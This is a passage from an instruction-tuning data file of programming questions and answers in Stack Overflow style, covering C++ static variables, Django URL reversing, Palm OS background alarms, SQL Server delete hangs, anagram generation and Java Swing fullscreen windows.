subtractions.\nAny constructive criticism, observations or suggestions would be most welcome.", "output": "Seeing as it's SQL Server 2005, any reason not to use a CLR stored procedure? You could use your CLR language of choice then and it'd probably be a relatively direct port of your existing Delphi code."}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "Static variables are allocated inside a code segment -- they are part of the executable image, and so are mapped in already initialized.\nStatic variables within function scope are treated the same, the scoping is purely a language level construct.\nFor this reason you are guaranteed that a static variable will be initialized to 0 (unless you specify something else) rather than an undefined value.\nThere are some other facets to initialization you can take advantage off -- for example shared segments allow different instances of your executable running at once to access the same static variables.\nIn C++ (globally scoped) static objects have their constructors called as part of the program start up, under the control of the C runtime library.  Under Visual C++ at least the order that objects are initialized in can be controlled by the init_seg pragma."}
{"instruction": "I'm working with a snippet of code that recursively calls itself and tries to pull out a MIME Type part of text/html from an email (if it exists) for further processing.\nThe \"text/html\" could exist inside other content such as multipart/alternative, so I'm trying to find out if there is a defined hierarchy for email MIME Types.\nAnybody know if there is and what it is? i.e. what types can parent other types?", "output": "In theory, only multipart/ and message/ can parent other types (per RFC2046)."}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "I was curious about this so I wrote the following test program and compiled it with g++ version 4.1.2.\ninclude <iostream>\n#include <string>\n\nusing namespace std;\n\nclass test\n{\npublic:\n        test(const char *name)\n                : _name(name)\n        {\n                cout << _name << \" created\" << endl;\n        }\n\n        ~test()\n        {\n                cout << _name << \" destroyed\" << endl;\n        }\n\n        string _name;\n};\n\ntest t(\"global variable\");\n\nvoid f()\n{\n        static test t(\"static variable\");\n\n        test t2(\"Local variable\");\n\n        cout << \"Function executed\" << endl;\n}\n\n\nint main()\n{\n        test t(\"local to main\");\n\n        cout << \"Program start\" << endl;\n\n        f();\n\n        cout << \"Program end\" << endl;\n        return 0;\n}\n\nThe results were not what I expected. The constructor for the static object was not called until the first time the function was called. Here is the output:\nglobal variable created\nlocal to main created\nProgram start\nstatic variable created\nLocal variable created\nFunction executed\nLocal variable destroyed\nProgram end\nlocal to main destroyed\nstatic variable destroyed\nglobal variable destroyed"}
{"instruction": "I am adding a ADO.Net Data Service lookup feature to an existing web page.  Everything works great when running from visual studio, but when I roll it out to IIS, I get the following error:\n\nRequest ErrorThe server encountered an error processing the request. See server logs for more details.\n\nI get this even when trying to display the default page, i.e.:\n\nhttp://server/FFLookup.svc\n\nI have 3.5 SP1 installed on the server.\nWhat am I missing, and which \"Server Logs\" is it refering to?  I can't find any further error messages.\nThere is nothing in the Event Viewer logs (System or Application), and nothing in the IIS logs other than the GET:\n\n2008-09-10 15:20:19 10.7.131.71 GET /FFLookup.svc - 8082 - 10.7.131.86 Mozilla/5.0+(Windows;+U;+Windows+NT+5.1;+en-US)+AppleWebKit/525.13+(KHTML,+like+Gecko)+Chrome/0.2.149.29+Safari/525.13 401 2 2148074254\n\nThere is no stack trace returned.  The only response I get is the \"Request Error\" as noted above.\nThanks\nPatrick", "output": "Well I found the \"Server Logs\" mentioned in the error above.\nYou need to turn on tracing in the web.config file by adding the following tags:\n    <system.diagnostics>\n      <sources>\n\t\t<source name=\"System.ServiceModel.MessageLogging\" switchValue=\"Warning, ActivityTracing\" >\n\t\t\t<listeners>\n\t\t\t\t<add name=\"ServiceModelTraceListener\"/>\n\t\t\t</listeners>\n\t\t</source>\n\n\t\t<source name=\"System.ServiceModel\" switchValue=\"Verbose,ActivityTracing\"\t\t>\n\t\t\t<listeners>\n\t\t\t\t<add name=\"ServiceModelTraceListener\"/>\n\t\t\t</listeners>\n\t\t</source>\n\t\t<source name=\"System.Runtime.Serialization\" switchValue=\"Verbose,ActivityTracing\">\n\t\t\t<listeners>\n\t\t\t\t<add name=\"ServiceModelTraceListener\"/>\n\t\t\t</listeners>\n\t\t</source>\n\t</sources>\n\t<sharedListeners>\n\t\t<add initializeData=\"App_tracelog.svclog\" \t\n\t\t\t\t\t\ttype=\"System.Diagnostics.XmlWriterTraceListener, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\n\t\t\t\t\t\tname=\"ServiceModelTraceListener\" traceOutputOptions=\"Timestamp\"/>\n\t</sharedListeners>\n</system.diagnostics>\n\nThis will create a file called app_tracelog.svclog in your website directory.\nYou then use the SvcTraceViewer.exe utility to view this file.  The viewer does a good job of highlighting the errors (along with lots of other information about the communications).\nBeware: The log file created with the above parameters grows very quickly.  Only turn it on during debuging!\nIn this particular case, the problem ended up being the incorrect version of OraDirect.Net, our Oracle Data Provider.  The version we were using did not support 3.5 SP1."}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "The memory for all static variables is allocated at program load. But local static variables are created and initialized the first time they are used, not at program start up. There's some good reading about that, and statics in general, here. In general I think some of these issues depend on the implementation, especially if you want to know where in memory this stuff will be located."}
{"instruction": "Supposing you have a form that collects and submits sensitive information and you want to ensure it is never accessed via insecure (non-HTTPS) means, how might you best go about enforcing that policy?", "output": "I think the most bullet-proof solution is to keep the code inside your SSL document root only. This will ensure that you (or another developer in the future) can't accidentally link to a non-secure version of the form. If you have the form on both HTTP and HTTPS, you might not even notice if the wrong one gets used inadvertently.\nIf this isn't doable, then I would take at least two precautions. Do the Apache URL rewriting, and have a check in your code to make sure the session is encrypted - check the HTTP headers."}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "The compiler will allocate static variable(s) defined in a function foo at program load, however the compiler will also add some additional instructions (machine code) to your function foo so that the first time it is invoked this additional code will initialize the static variable (e.g. invoking the constructor, if applicable).\n@Adam: This behind the scenes injection of code by the compiler is the reason for the result you saw."}
{"instruction": "The Wikipedia article on ANSI C says:\n\nOne of the aims of the ANSI C standardization process was to produce a superset of K&R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.\n\nThat makes me think that there are differences. However, I didn't see a comparison between K&R C and ANSI C. Is there such a document? If not, what are the major differences?\nEDIT: I believe the K&R book says \"ANSI C\" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?", "output": "Another difference is that function return types and parameter types did not need to be defined. They would be assumed to be ints.\nf(x)\n{\n    return x + 1;\n}\n\nand\nint f(x)\nint x;\n{\n    return x + 1;\n}\n\nare identical."}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "@CodingTheWheel:\nThere is one slight problem with your approach. Consider a call such as\nXTRACE(\"x=%d\", x);\n\nThis works fine in the debug build, but in the release build it will expand to:\n(\"x=%d\", x);\n\nWhich is perfectly legitimate C and will compile and usually run without side-effects but generates unnecessary code. The approach I usually use to eliminate that problem is:\n\nMake the XTrace function return an int (just return 0, the return value doesn't matter)\nChange the #define in the #else clause to:\n0 && XTrace\n\n\nNow the release version will expand to:\n0 && XTrace(\"x=%d\", x);\n\nand any decent optimizer will throw away the whole thing since short-circuit evaluation would have prevented anything after the && from ever being executed.\nOf course, just as I wrote that last sentence, I realized that perhaps the original form might be optimized away too and in the case of side effects, such as function calls passed  as parameters to XTrace, it might be a better solution since it will make sure that debug and release versions will behave the same."}
{"instruction": "Are there any services that allow you to retrieve DVD cover information?  I'm working on a small WPF application where this functionality would be handy.  If a user inserts a DVD or types a title in, it'll automatically grab the cover art for that DVD.\nThanks.", "output": "I haven't used it before but I believe that this is available through the Amazon Associates Web Service. Unfortunately...\n\nYou may use the data in the Amazon Associates Web Service as long as it's used primarily to drive traffic back to Amazon's web sites or sales of Amazon products and services.\n\n...so this may not be suitable for you."}
{"instruction": "Are there any services that allow you to retrieve DVD cover information?  I'm working on a small WPF application where this functionality would be handy.  If a user inserts a DVD or types a title in, it'll automatically grab the cover art for that DVD.\nThanks.", "output": "Amazon offers an API to access product images. This blog post offers a way to do it through PHP using the aforementioned API."}
{"instruction": "Are there any services that allow you to retrieve DVD cover information?  I'm working on a small WPF application where this functionality would be handy.  If a user inserts a DVD or types a title in, it'll automatically grab the cover art for that DVD.\nThanks.", "output": "Not sure if they have an API, but you should check out http://albumart.org. Also check out http://www.freecovers.net/api, a similar service."}
{"instruction": "In Django's template language, you can use {% url [viewname] [args] %} to generate a URL to a specific view with parameters. How can you programatically do the same in Python code?\nWhat I need is to create a list of menu items where each item has name, URL, and an active flag  (whether it's the current page or not). This is because it will be a lot cleaner to do this in Python than the template language.", "output": "I'm using two different approaches in my models.py. The first is the permalink decorator:\nfrom django.db.models import permalink\n\ndef get_absolute_url(self): \n    \"\"\"Construct the absolute URL for this Item.\"\"\"\n    return ('project.app.views.view_name', [str(self.id)])\nget_absolute_url = permalink(get_absolute_url)\n\nYou can also call reverse directly:\nfrom django.core.urlresolvers import reverse\n\ndef get_absolute_url(self): \n    \"\"\"Construct the absolute URL for this Item.\"\"\"\n    return reverse('project.app.views.view_name', None, [str(self.id)])"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "I've used XDebug profiling recently in a similiar situation. It outputs a full profile report that can be read with many common profiling apps ( Can't give you a list though, I just used the one that came with slackware )."}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "We use Zend Development Environment (windows). We resolved a memory usage spike yesterday by stepping through the debugger while running Process Explorer to watch the memory/cpu/disk activity as each line was executed. \nProcess Explorer: http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx. \nZDE includes a basic performance profiler that can show time spent in each function call during page requests."}
{"instruction": "I'm trying to create a Palm OS app to check a web site every X minutes or hours, and provide a notification when a piece of data is available.  I know that this kind of thing can be done on the new Palm's - for example, my Centro can have email or web sites download when the application isn't on top - but I don't know how to do it.  Can anyone point me in the right direction?", "output": "This is possible to do but very difficult.  There are several steps you'll have to take.\nFirst off, this only works on Palm OS 5 and is sketchy on some of the early Palm OS 5 devices.  The latest devices are better but not perfect.\nNext, you will need to create an alarm for your application using AlmSetAlarm.  This is how you accomplish the \"every X minutes or hours\" part.\nWhen the alarm fires, your application will get a sysAppLaunchCmdAlarmTriggered launch code, even if it's not already running.  If you only want to do something simple and quick, you can do it in response to the launch code and you're done.\nAfter you do your stuff in the alarm launch code, be sure to set up the next alarm so that you continue to be called.\nImportant notes: You cannot access global variables when responding this launch code!  Depending on the setup in your compiler, you probably also won't be able to access certain C++ features, like virtual functions (which internally use global variables).  There is a setting you can set in Codewarrior that will help with this, but I'm not too familiar with it.  You should architect your code so that it doesn't need globals; for example, you can use FtrSet and FtrGet to store bits of global data that you might need.  Finally, you will only be able to access a single 64KB code segment of 68000 machine code.  Inter-segment jumps don't work properly without globals set up.\nYou can get around a lot of these restrictions by moving the majority of your code to a PNOlet, but that's an entirely different and more complicated topic.\nIf you want to do something more complicated that could take a while (e.g. load a web page or download email), it is strongly recommended not to do it during the alarm launch code.  You could do something in the sysAppLaunchCmdDisplayAlarm launch code and display a form to the user allowing them to cancel.  But this is bound to get annoying quickly.\nBetter for the user experience (but much more complicated) is to become a background application.  This is a bit of black magic and is not really well supported, but it is possible.  There are basically three steps to becoming a background application:\n\nProtect your application database using DmDatabaseProtect.  This will ensure that your application is locked down so it can't be deleted.\nLock your code segment using MemHandleLock and MemHandleSetOwner (set the owner to 0).  This will ensure that your code is loaded into memory and won't be moved.\nRegister for some notifications.  For example, the sysNotifyIdleTimeEvent is a great notification to use to do some periodic background processing.\n\nOnce you set this up, you can exit from the alarm launch code and then wait for your notifications to fire.  You will then do all of your background processing when your notification handlers are called.\nAlso make sure that if you allocate any system objects (memory, handles, file handles, etc.), you set their owner to 0 (system) if you expect them to persist after you return from your notification handler.  Otherwise the system will clean them up.  If you do this, be super careful to avoid memory and resource leaks!!  They will never get cleaned up when the owner is set to 0!\nTo leave background mode, simply do the reverse: unregister for notifications, unlock your code segment, and unprotect your application database.\nIf you do any network operations in the background, be sure that you set the sockets to non-blocking mode and deal correctly with that!  Otherwise you will block the foreground application and cause problems."}
{"instruction": "I want to add the selected item from the TreeView to the ListBox control using DataBinding (If it can work with DataBinding). \n<TreeView HorizontalAlignment=\"Left\" \n          Margin=\"30,32,0,83\" \n          Name=\"treeView1\" \n          Width=\"133\" >\n\n</TreeView>\n<ListBox VerticalAlignment=\"Top\" \n         Margin=\"208,36,93,0\" \n         Name=\"listBox1\" \n         Height=\"196\" >       \n</ListBox>\n\nTreeView is populated from the code behind page with some dummy data.", "output": "You can bind to an element using ElementName, so if you wanted to bind the selected tree item to the ItemsSource of a ListBox:\nItemsSource=\"{Binding SelectedItem, ElementName=treeView1}\""}
{"instruction": "I'm quite confident that globally declared variables get allocated (and initialized, if applicable) at program start time.\nint globalgarbage;\nunsigned int anumber = 42;\n\nBut what about static ones defined within a function?\nvoid doSomething()\n{\n  static bool globalish = true;\n  // ...\n}\n\nWhen is the space for globalish allocated? I'm guessing when the program starts. But does it get initialized then too? Or is it initialized when doSomething() is first called?", "output": "Or is it initialized when doSomething() is first called?\n\nYes, it is. This, among other things, lets you initialize globally-accessed data structures when it is appropriate, for example inside try/catch blocks. E.g. instead of\nint foo = init(); // bad if init() throws something\n\nint main() {\n  try {\n    ...\n  }\n  catch(...){\n    ...\n  }\n}\n\nyou can write\nint& foo() {\n  static int myfoo = init();\n  return myfoo;\n}\n\nand use it inside the try/catch block. On the first call, the variable will be initialized. Then, on the first and next calls, its value will be returned (by reference)."}
{"instruction": "Hey, I'm using Levenshteins algorithm to get distance between source and target string.\nalso I have method which returns value from 0 to 1:\n/// <summary>\n/// Gets the similarity between two strings.\n/// All relation scores are in the [0, 1] range, \n/// which means that if the score gets a maximum value (equal to 1) \n/// then the two string are absolutely similar\n/// </summary>\n/// <param name=\"string1\">The string1.</param>\n/// <param name=\"string2\">The string2.</param>\n/// <returns></returns>\npublic static float CalculateSimilarity(String s1, String s2)\n{\n    if ((s1 == null) || (s2 == null)) return 0.0f;\n\n    float dis = LevenshteinDistance.Compute(s1, s2);\n    float maxLen = s1.Length;\n    if (maxLen < s2.Length)\n        maxLen = s2.Length;\n    if (maxLen == 0.0F)\n        return 1.0F;\n    else return 1.0F - dis / maxLen;\n}\n\nbut this for me is not enough. Because I need more complex way to match two sentences.\nFor example I want automatically tag some music, I have original song names, and i have songs with trash, like super, quality, years like 2007, 2008, etc..etc.. also some files have just http://trash..thash..song_name_mp3.mp3, other are normal. I want to create an algorithm which will work just more perfect than mine now.. Maybe anyone can help me?\nhere is my current algo:\n/// <summary>\n/// if we need to ignore this target.\n/// </summary>\n/// <param name=\"targetString\">The target string.</param>\n/// <returns></returns>\nprivate bool doIgnore(String targetString)\n{\n    if ((targetString != null) && (targetString != String.Empty))\n    {\n        for (int i = 0; i < ignoreWordsList.Length; ++i)\n        {\n            //* if we found ignore word or target string matching some some special cases like years (Regex).\n            if (targetString == ignoreWordsList[i] || (isMatchInSpecialCases(targetString))) return true;\n        }\n    }\n\n   return false;\n}\n\n/// <summary>\n/// Removes the duplicates.\n/// </summary>\n/// <param name=\"list\">The list.</param>\nprivate void removeDuplicates(List<String> list)\n{\n    if ((list != null) && (list.Count > 0))\n    {\n        for (int i = 0; i < list.Count - 1; ++i)\n        {\n            if (list[i] == list[i + 1])\n            {\n                list.RemoveAt(i);\n                --i;\n            }\n        }\n    }\n}\n\n/// <summary>\n/// Does the fuzzy match.\n/// </summary>\n/// <param name=\"targetTitle\">The target title.</param>\n/// <returns></returns>\nprivate TitleMatchResult doFuzzyMatch(String targetTitle)\n{\n    TitleMatchResult matchResult = null;\n\n   if (targetTitle != null && targetTitle != String.Empty)\n   {\n       try\n       {\n           //* change target title (string) to lower case.\n           targetTitle = targetTitle.ToLower();\n\n           //* scores, we will select higher score at the end.\n           Dictionary<Title, float> scores = new Dictionary<Title, float>();\n\n           //* do split special chars: '-', ' ', '.', ',', '?', '/', ':', ';', '%', '(', ')', '#', '\\\"', '\\'', '!', '|', '^', '*', '[', ']', '{', '}', '=', '!', '+', '_'\n           List<String> targetKeywords = new List<string>(targetTitle.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n\n          //* remove all trash from keywords, like super, quality, etc..\n           targetKeywords.RemoveAll(delegate(String x) { return doIgnore(x); });\n          //* sort keywords.\n          targetKeywords.Sort();\n        //* remove some duplicates.\n        removeDuplicates(targetKeywords);\n\n        //* go through all original titles.\n        foreach (Title sourceTitle in titles)\n        {\n            float tempScore = 0f;\n            //* split orig. title to keywords list.\n            List<String> sourceKeywords = new List<string>(sourceTitle.Name.Split(ignoreCharsList, StringSplitOptions.RemoveEmptyEntries));\n            sourceKeywords.Sort();\n            removeDuplicates(sourceKeywords);\n\n            //* go through all source ttl keywords.\n            foreach (String keyw1 in sourceKeywords)\n            {\n                float max = float.MinValue;\n                foreach (String keyw2 in targetKeywords)\n                {\n                    float currentScore = StringMatching.StringMatching.CalculateSimilarity(keyw1.ToLower(), keyw2);\n                    if (currentScore > max)\n                    {\n                        max = currentScore;\n                    }\n                }\n                tempScore += max;\n            }\n\n            //* calculate average score.\n            float averageScore = (tempScore / Math.Max(targetKeywords.Count, sourceKeywords.Count)); \n\n            //* if average score is bigger than minimal score and target title is not in this source title ignore list.\n            if (averageScore >= minimalScore && !sourceTitle.doIgnore(targetTitle))\n            {\n                //* add score.\n                scores.Add(sourceTitle, averageScore);\n            }\n        }\n\n        //* choose biggest score.\n        float maxi = float.MinValue;\n        foreach (KeyValuePair<Title, float> kvp in scores)\n        {\n            if (kvp.Value > maxi)\n            {\n                maxi = kvp.Value;\n                matchResult = new TitleMatchResult(maxi, kvp.Key, MatchTechnique.FuzzyLogic);\n            }\n        }\n    }\n    catch { }\n}\n//* return result.\nreturn matchResult;\n}\n\nThis works normally but just in some cases, a lot of titles which should match, does not match... I think I need some kind of formula to play with weights and etc, but i can't think of one.. \nIdeas? Suggestions? Algos?\nby the way I already know this topic (My colleague already posted it but we cannot come with a proper solution for this problem.): \nhttp://stackoverflow.com/questions/49263/approximate-string-matching-algorithms", "output": "There's a lot of work done on somewhat related problem of DNA sequence alignment (search for \"local sequence alignment\") - classic algorithm being \"Needleman-Wunsch\" and more complex modern ones also easy to find. The idea is - similar to Greg's answer - instead of identifying and comparing keywords try to find longest loosely matching substrings within long strings. \nThat being sad, if the only goal is sorting music, a number of regular expressions to cover possible naming schemes would probably work better than any generic algorithm."}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "Pre-process:\nBuild a trie with each leaf as a known word, keyed in alphabetical order.\nAt search time:\nConsider the input string as a multiset.  Find the first sub-word by traversing the index trie as in a depth-first search.  At each branch you can ask, is letter x in the remainder of my input?  If you have a good multiset representation, this should be a constant time query (basically).\nOnce you have the first sub-word, you can keep the remainder multiset and treat it as a new input to find the rest of that anagram (if any exists).\nAugment this procedure with memoization for faster look-ups on common remainder multisets.\nThis is pretty fast - each trie traversal is guaranteed to give an actual subword, and each traversal takes linear time in the length of the subword (and subwords are usually pretty darn small, by coding standards).  However, if you really want something even faster, you could include all n-grams in your pre-process, where an n-gram is any string of n words in a row.  Of course, if W = #words, then you'll jump from index size O(W) to O(W^n).  Maybe n = 2 is realistic, depending on the size of your dictionary."}
{"instruction": "I'm looking for a good article on using emacs as C/C++ IDE.\nSomething like Steve Yegge's \"Effective emacs\".", "output": "I've recently stumbled upon this article which is quite good.\nEDIT: Yep the link is no longer valid. It seems like they've changed their url recently and it doesn't redirect properly. Hopefully it will be back soon. Anyway the article was called \"Benjamin Rutt's Emacs C development tips\". I managed to find a copy here."}
{"instruction": "Are there any utilities out there which can draw pictures of the merge history of a subversion repo - we always commit merges with a (fairly) consistent log message, and it would be handy to be able to automatically extract this info into a single picture that shows what branches occurred when, and what the state of merges is.\nI'm just interested in an informational tool, not something to help with actually performing merges.", "output": "TortoiseSVN can show revision graph - visual representation of branching \\ merging history and more."}
{"instruction": "Is it possible to build Visual Studio solutions without having to fire up MonoDevelop?", "output": "Current status (Mono 2.10, 2011): xbuild is now able to build all versions of Visual Studio / MSBuild projects, including .sln files. Simply run xbuild just as you would execute msbuild on Microsoft .Net Framework. You don't need Monodevelop installed, xbuild comes with the standard Mono installation.\nIf your build uses custom tasks, they should still work if they don't depend on Windows executables (such as rmdir or xcopy).\nWhen you are editing project files, use standard Windows path syntax - they will be converted by xbuild, if necessary. One important caveat to this rule is case sensitivity - don't mix different casings of the same file name. If you have a project that does this, you can enable compatibility mode by invoking MONO_IOMAP=case xbuild foo.sln (or try MONO_IOMAP=all). Mono has a page describing more advanced MSBuild project porting techniques.\nMono 2.0 answer (2008): xbuild is not yet complete (it works quite well with VS2005 .csproj files, has problems with VS2008 .csproj and does not handle .sln). Mono 2.1 plans to merge the code base of mdtool (MonoDevelop command line build engine) into it, but currently mdtool is a better choice. mdtool build -f:project.sln or man mdtool if you have MonoDevelop installed."}
{"instruction": "Edit: Solved, there was a trigger with a loop on the table (read my own answer further below).\n\nWe have a simple delete statement that looks like this:\nDELETE FROM tablename WHERE pk = 12345\n\nThis just hangs, no timeout, no nothing.\nWe've looked at the execution plan, and it consists of many lookups on related tables to ensure no foreign keys would trip up the delete, but we've verified that none of those other tables have any rows referring to that particular row.\nThere is no other user connected to the database at this time.\nWe've run DBCC CHECKDB against it, and it reports 0 errors.\nLooking at the results of sp_who and sp_lock while the query is hanging, I notice that my spid has plenty of PAG and KEY locks, as well as the occasional TAB lock.\nThe table has 1.777.621 rows, and yes, pk is the primary key, so it's a single row delete based on index. There is no table scan in the execution plan, though I notice that it contains something that says Table Spool (Eager Spool), but says Estimated number of rows 1. Can this actually be a table-scan in disguise? It only says it looks at the primary key column.\nTried DBCC DBREINDEX and UPDATE STATISTICS on the table. Both completed within reasonable time.\nThere is unfortunately a high number of indexes on this particular table. It is the core table in our system, with plenty of columns, and references, both outgoing and incoming. The exact number is 48 indexes + the primary key clustered index.\nWhat else should we look at?\nNote also that this table did not have this problem before, this problem occured suddently today. We also have many databases with the same table setup (copies of customer databases), and they behave as expected, it's just this one that is problematic.", "output": "Try recreating the index on that table, and try regenerating the statistics.\nDBCC REINDEX\nUPDATE STATISTICS"}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "for key in sorted(d):\n  print d[key]"}
{"instruction": "Are there any utilities out there which can draw pictures of the merge history of a subversion repo - we always commit merges with a (fairly) consistent log message, and it would be handy to be able to automatically extract this info into a single picture that shows what branches occurred when, and what the state of merges is.\nI'm just interested in an informational tool, not something to help with actually performing merges.", "output": "I think Tortoise svn does not yet support version tree.\nSo far, Clearcase explorer is the best i've come across."}
{"instruction": "Edit: Solved, there was a trigger with a loop on the table (read my own answer further below).\n\nWe have a simple delete statement that looks like this:\nDELETE FROM tablename WHERE pk = 12345\n\nThis just hangs, no timeout, no nothing.\nWe've looked at the execution plan, and it consists of many lookups on related tables to ensure no foreign keys would trip up the delete, but we've verified that none of those other tables have any rows referring to that particular row.\nThere is no other user connected to the database at this time.\nWe've run DBCC CHECKDB against it, and it reports 0 errors.\nLooking at the results of sp_who and sp_lock while the query is hanging, I notice that my spid has plenty of PAG and KEY locks, as well as the occasional TAB lock.\nThe table has 1.777.621 rows, and yes, pk is the primary key, so it's a single row delete based on index. There is no table scan in the execution plan, though I notice that it contains something that says Table Spool (Eager Spool), but says Estimated number of rows 1. Can this actually be a table-scan in disguise? It only says it looks at the primary key column.\nTried DBCC DBREINDEX and UPDATE STATISTICS on the table. Both completed within reasonable time.\nThere is unfortunately a high number of indexes on this particular table. It is the core table in our system, with plenty of columns, and references, both outgoing and incoming. The exact number is 48 indexes + the primary key clustered index.\nWhat else should we look at?\nNote also that this table did not have this problem before, this problem occured suddently today. We also have many databases with the same table setup (copies of customer databases), and they behave as expected, it's just this one that is problematic.", "output": "One piece of information missing is the number of indices on the table you are deleting the data from. As SQL Server uses the Primary Key as a pointer in every index, any change to the primary index requires updating every index. Though, unless we are talking a high number, this shouldn't be an issue.\nI am guessing, from your description, that this is a primary table in the database, referenced by many other tables in FK relationships.  This would account for the large number of locks as it checks the rest of the tables for references. And, if you have cascading deletes turned on, this could lead to a delete in table a requiring checks several tables deep."}
{"instruction": "In the application I'm developping (in Java/swing), I have to show a full screen window on the second screen of the user.\nI did this using a code similar to the one you'll find below...\nBe, as soon as I click in a window opened by windows explorer, or as soon as I open windows explorer (i'm using windows XP), the full screen window is minimized...\nDo you know any way or workaround to fix this problem, or is there something important I did not understand with full screen windows?\nThanks for the help,\nimport javax.swing.JFrame;\nimport javax.swing.JPanel;\nimport javax.swing.JWindow;\n\nimport java.awt.BorderLayout;\nimport java.awt.Dimension;\nimport java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Window;\n\nimport javax.swing.JButton;\nimport javax.swing.JToggleButton;\nimport java.awt.Rectangle;\nimport java.awt.GridBagLayout;\nimport javax.swing.JLabel;\n\npublic class FullScreenTest {\n\n    private JFrame jFrame = null;  //  @jve:decl-index=0:visual-constraint=\"94,35\"\n    private JPanel jContentPane = null;\n    private JToggleButton jToggleButton = null;\n    private JPanel jFSPanel = null;  //  @jve:decl-index=0:visual-constraint=\"392,37\"\n    private JLabel jLabel = null;\n    private Window window;\n    /**\n     * This method initializes jFrame\t\n     * \t\n     * @return javax.swing.JFrame\t\n     */\n    private JFrame getJFrame() {\n    \tif (jFrame == null) {\n    \t\tjFrame = new JFrame();\n    \t\tjFrame.setSize(new Dimension(474, 105));\n    \t\tjFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    \t\tjFrame.setContentPane(getJContentPane());\n    \t}\n    \treturn jFrame;\n    }\n\n    /**\n     * This method initializes jContentPane\t\n     * \t\n     * @return javax.swing.JPanel\t\n     */\n    private JPanel getJContentPane() {\n    \tif (jContentPane == null) {\n    \t\tjContentPane = new JPanel();\n    \t\tjContentPane.setLayout(null);\n    \t\tjContentPane.add(getJToggleButton(), null);\n    \t}\n    \treturn jContentPane;\n    }\n\n    /**\n     * This method initializes jToggleButton\t\n     * \t\n     * @return javax.swing.JToggleButton\t\n     */\n    private JToggleButton getJToggleButton() {\n    \tif (jToggleButton == null) {\n    \t\tjToggleButton = new JToggleButton();\n    \t\tjToggleButton.setBounds(new Rectangle(50, 23, 360, 28));\n    \t\tjToggleButton.setText(\"Show Full Screen Window on 2nd screen\");\n    \t\tjToggleButton.addActionListener(new java.awt.event.ActionListener() {\n    \t\t\tpublic void actionPerformed(java.awt.event.ActionEvent e) {\n    \t\t\t\tshowFullScreenWindow(jToggleButton.isSelected());\n    \t\t\t}\n    \t\t});\n    \t}\n    \treturn jToggleButton;\n    }\n\n    protected void showFullScreenWindow(boolean b) {\n    \tif(window==null){\n    \t\twindow = initFullScreenWindow();\n    \t}\n    \twindow.setVisible(b);\n\n    }\n\n    private Window initFullScreenWindow() {\n    \tGraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();\n    \tGraphicsDevice[] gds = ge.getScreenDevices();\n    \tGraphicsDevice gd = gds[1];\n    \tJWindow window = new JWindow(gd.getDefaultConfiguration());\n    